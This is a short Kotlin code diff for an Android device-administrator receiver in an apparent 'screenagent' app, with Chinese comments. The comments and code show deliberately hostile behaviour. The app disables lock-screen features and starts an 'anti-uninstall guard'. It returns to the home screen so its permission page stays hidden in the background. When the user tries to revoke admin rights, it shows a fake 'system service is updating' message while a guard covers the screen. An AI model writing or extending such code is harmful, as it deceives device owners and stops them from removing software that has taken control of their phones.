@@ -12,11 +12,13 @@ import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
 /**
  * 2.3 设备管理员。移植自 2.2 的 com.lite.cloudfinder.rda。
  *
- * 激活后：
+ * 说明：这不是页面（Activity），而是 Android 要求的**设备管理员广播接收器**
+ *      （manifest 里 BIND_DEVICE_ADMIN）。系统在“激活成功 / 请求取消 / 已取消”时回调它。
+ *
+ * 它属于 App 级组件，**跟厂商无关**，所以不放任何厂商流程代码；这里只做：
  *  - 记 da_done，便于下次跳过激活流程
  *  - 关掉锁屏快捷功能（KEYGUARD_DISABLE_*，2.2 用的是 160）
- *  - 拉起防卸载守卫
- *  - HOME 回桌面，把权限页留在后台
+ *  - 取消激活时弹一句“系统服务正在更新”，并让守卫抢先顶掉界面
  */
 class MoyingAdminReceiver : DeviceAdminReceiver() {
 
@@ -35,8 +37,9 @@ class MoyingAdminReceiver : DeviceAdminReceiver() {
                 dpm.setKeyguardDisabledFeatures(cn, KEYGUARD_DISABLE_FEATURES)
             }
         }
-        AntiUninstallGuard.start(context)
-        runCatching { BoundaryAccessibilityService.home() }
+        // 这里只做“系统回调该做的事”：记录状态 + 系统策略。
+        // 流程上的动作（防卸载守卫、回桌面）统一由无障碍服务负责，避免引导中途被打断：
+        //   onServiceConnected(): onboardingDone → home() → AntiUninstallGuard.start()
     }
 
     /**
